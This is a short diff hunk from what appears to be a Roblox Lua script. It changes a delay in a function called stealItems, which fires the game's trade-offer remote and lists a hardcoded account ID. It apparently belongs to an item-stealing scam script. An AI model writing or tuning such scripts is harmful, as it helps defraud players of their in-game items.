@@ -270,7 +270,7 @@ local function stealItems()
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
 
-        wait(6)
+        wait(7)
 
         local acc = {
             [1] = 285646582 
